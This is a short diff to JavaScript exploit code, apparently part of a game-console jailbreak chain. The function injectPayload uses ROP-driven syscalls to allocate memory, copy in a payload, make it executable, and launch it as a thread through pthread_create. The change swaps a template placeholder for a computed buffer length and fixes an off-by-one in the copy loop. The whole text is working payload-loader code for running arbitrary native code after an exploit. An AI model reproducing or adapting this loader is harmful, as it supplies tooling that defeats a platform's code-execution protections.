@@ -563,13 +563,14 @@ function injectPayload() //single payload inject for both conditions/removed nee
 {
 	var payload_buffer = chain.syscall(477, new int64(0x26200000, 0x9), 0x300000, 7, 0x41000, -1, 0);
 	##PAYLOAD##
-	var payload_loader = p.malloc32(##BUF##);
+	var bufLen = payload.length * 4
+	var payload_loader = p.malloc32(bufLen);
 	var loader_writer = payload_loader.backing;
-	for(var i=0; i < (payload.length - 1); i++)
+	for(var i=0; i < payload.length; i++)
 	{
 		loader_writer[i] = payload[i];
 	}
-	chain.syscall(74, payload_loader, ##BUF##, (0x1 | 0x2 | 0x4));
+	chain.syscall(74, payload_loader, bufLen, (0x1 | 0x2 | 0x4));
 	var pthread = p.malloc(0x10);
 	chain.call(libKernelBase.add32(OFFSET_lk_pthread_create), pthread, 0x0, payload_loader, payload_buffer);
 	donemsg();
